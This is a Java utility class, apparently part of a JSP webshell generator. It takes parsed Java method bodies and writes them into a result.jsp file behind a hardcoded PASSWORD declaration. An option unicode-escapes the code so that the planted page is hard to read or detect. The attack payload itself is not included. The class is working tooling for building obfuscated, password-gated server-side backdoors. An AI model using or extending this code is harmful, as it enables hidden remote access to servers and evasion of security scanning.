package org.sec.util;

import com.github.javaparser.ast.body.MethodDeclaration;

public class WriteUtil {
    public static void write(MethodDeclaration method, MethodDeclaration decMethod,
                             String password, boolean useUnicode) {
        try {
            String passwordCode = "<%! String PASSWORD = \"" + password + "\"; %>";
            String code = method.getBody().isPresent() ? method.getBody().get().toString() : null;
            String decCode = decMethod.toString();
            if (code != null && decCode != null) {
                String source = code.substring(1, code.length() - 2);
                String newCode = compactCode(source);
                String newDecCode = compactCode(decCode);

                if (useUnicode) {
                    newCode = UnicodeUtil.encodeString(newCode);
                    newDecCode = UnicodeUtil.encodeString(newDecCode);
                    String output = passwordCode + "<%!" + newDecCode + "%><% " + newCode + " %>";
                    FileUtil.writeFile("result.jsp", output);
                } else {
                    String output = passwordCode + "<%!" + decCode + "%><%" + source + " %>";
                    FileUtil.writeFile("result.jsp", output);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String compactCode(String input) {
        String[] codes = input.split(System.getProperty("line.separator"));
        StringBuilder codeBuilder = new StringBuilder();
        for (String c : codes) {
            codeBuilder.append(c.trim());
        }
        return codeBuilder.toString().trim();
    }
}
